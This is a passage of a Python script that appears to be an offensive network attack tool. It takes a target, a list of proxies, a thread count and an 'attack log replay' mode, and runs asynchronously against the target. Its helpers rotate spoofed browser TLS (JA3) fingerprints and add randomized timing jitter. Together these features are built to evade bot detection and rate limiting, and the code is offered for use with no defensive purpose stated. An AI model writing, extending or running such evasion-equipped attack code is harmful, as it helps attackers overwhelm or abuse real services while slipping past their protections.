    parser.add_argument("proxies", help="Comma-separated list of proxies")
    parser.add_argument("threads", type=int, help="Number of threads")
    parser.add_argument("--tls", action="store_true", help="Use TLS spoofing")
    parser.add_argument("--replay-mode", choices=["successful", "failed"], help="Replay mode for attack log replay")
    args = parser.parse_args()

    proxies = load_proxies(args.proxies)
    asyncio.run(main(args.target, proxies, args.threads, None, args.tls, args.replay_mode))

# TLS Session Reuse
JA3_FINGERPRINTS = [
    "chrome_112", "chrome_113", "chrome_120",
    "firefox_109", "firefox_110", "safari_15_6_1",
    "edge_109", "opera_95", "ios_15_5"
]

def get_random_tls_session(target):
    cid = random.choice(JA3_FINGERPRINTS)
    s = Session(client_identifier=cid)
    s.headers.update(generate_headers(target))
    return s

def smart_jitter():
    base = random.uniform(0.15, 0.5)
    if random.random() < 0.2:
        return base + random.uniform(0.5, 2.5)
    return base